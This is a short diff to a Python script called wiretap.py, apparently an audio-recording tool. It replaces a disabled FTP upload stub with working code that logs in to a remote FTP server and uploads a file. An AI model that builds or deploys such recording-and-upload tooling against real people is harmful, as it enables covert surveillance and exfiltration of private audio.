@@ -8,7 +8,7 @@ import sounddevice as sd
 from scipy.io.wavfile import write
 from pathlib import Path
 from datetime import datetime
-from ftplib import FTP
+import ftplib
 import fileinput
 
 class Colors:
@@ -47,14 +47,17 @@ def Help():
 	print ("python wiretap.py --help					- " + Colors.Header + "Displays this message" + Colors.Normal)
 
 def UploadFTP(hostname, username, password, filename):
-	ftp = FTP()
-	ftp.set_debuglevel(2)
-	ftp.connect(hostname, 21)
-	ftp.login(username, password)
-	fp = open(filename, 'rb')
-	ftp.storbinary('STOR %s' % os.path.basename(filename), fp, 1024)
-	fp.close()
-	print ("Function Not Available In This Release, Check Future Releases")
+	try:
+		ftp = ftplib.FTP()
+		ftp.set_debuglevel(2)
+		ftp.connect(hostname, 21)
+		ftp.login(username, password)
+		fp = open(filename, 'rb')
+		ftp.storbinary('STOR %s' % os.path.basename(filename), fp, 1024)
+		fp.close()
+		ftp.close()
+	except (ftplib.all_errors), msg:
+		print ("Error: " + str(msg))
 
 if __name__ == '__main__':
 	if(len(sys.argv) > 1):
